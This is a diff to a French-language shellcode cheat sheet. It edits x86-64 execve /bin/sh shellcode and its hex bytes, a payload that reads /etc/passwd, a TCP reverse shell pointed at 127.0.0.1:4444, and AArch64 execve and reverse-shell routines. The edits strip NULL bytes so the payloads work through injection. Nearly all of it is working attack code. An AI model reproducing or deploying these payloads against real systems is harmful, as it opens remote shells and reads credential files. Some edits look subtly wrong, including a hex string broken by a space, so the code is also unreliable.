@@ -32,7 +32,7 @@ _start:
 Shellcode : b03b4831d25248bf2f62696e2f2f7368574889e752574889e60f05
 ```
 
-### 1.2 execve /bin/sh - variante plus courte (22 bytes)
+### 1.2 execve /bin/sh - variante argv=NULL (26 bytes)
 
 ```nasm
 section .text
@@ -49,7 +49,7 @@ _start:
 ```
 
 ```
-Shellcode : 4831f6564889e752574889e74831d26a3b580f05
+Shellcode : 4831f65648bf2f62696e2f2f736857 4889e74831d26a3b580f05
 ```
 
 ### 1.3 Reverse shell TCP (environ 74 bytes)
@@ -187,7 +187,8 @@ _start:
     xor rsi, rsi            ; O_RDONLY = 0
     mul rsi                 ; rax=0, rdx=0
     push rax                ; null terminator
-    mov rbx, 'wd'           ; 2 derniers chars
+    xor rbx, rbx
+    mov bx, 'wd'            ; 2 bytes -> registre 16-bit (pas de padding)
     push rbx
     mov rbx, '/etc/pass'
     push rbx
@@ -198,7 +199,9 @@ _start:
 
     ; read(fd, buf, 4096)
     xchg rdi, rax           ; fd
-    sub rsp, 4096           ; buffer sur la stack
+    xor rcx, rcx
+    mov ch, 0x10             ; rcx = 0x1000 (4096) sans NULL bytes
+    sub rsp, rcx             ; buffer sur la stack
     mov rsi, rsp
     mov dx, 0x0fff          ; count = 4095 (evite null)
     xor rax, rax            ; read syscall = 0
@@ -325,7 +328,10 @@ _start:
     xchg edi, eax            ; sockfd
 
     ; connect(sockfd, addr, 16)
-    push 0x0100007f          ; 127.0.0.1 (modifier ici)
+    ; IP 127.0.0.1 via NOT (evite les NULL bytes)
+    mov ebx, ~0x0100007f     ; NOT de l'IP (modifier ici)
+    not ebx
+    push ebx
     push word 0x5c11         ; port 4444 (modifier ici)
     push word 2              ; AF_INET
     mov ecx, esp
@@ -446,7 +452,7 @@ _start:
     mov x1, xzr              // argv = NULL
     adr x0, shell             // x0 = &"/bin/sh"
     mov x8, #221              // execve syscall
-    svc #0
+    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
 
 shell:
     .ascii "/bin/sh\0"
@@ -473,7 +479,7 @@ _start:
     mov x0, sp
 
     mov x8, #221              // execve
-    svc #0
+    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
 ```
 
 ### 3.3 Reverse shell TCP
@@ -487,7 +493,7 @@ _start:
     mov x1, #1
     mov x2, xzr
     mov x8, #198              // socket
-    svc #0
+    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
     mov x12, x0               // save sockfd
 
     // connect - struct sockaddr_in sur la stack
@@ -502,7 +508,7 @@ _start:
     mov x1, sp
     mov x2, #16
     mov x8, #203              // connect
-    svc #0
+    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
 
     // dup2 loop
     mov x1, #3
@@ -510,7 +516,7 @@ dup_loop:
     sub x1, x1, #1
     mov x0, x12
     mov x8, #24               // dup3 (on aarch64)
-    svc #0
+    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
     cbnz x1, dup_loop
 
     // execve
@@ -523,7 +529,7 @@ dup_loop:
     str x3, [sp, #-16]!
     mov x0, sp
     mov x8, #221
-    svc #0
+    svc #0x1337              // imm ignore par le kernel, evite NULL bytes
 ```
 
 ---
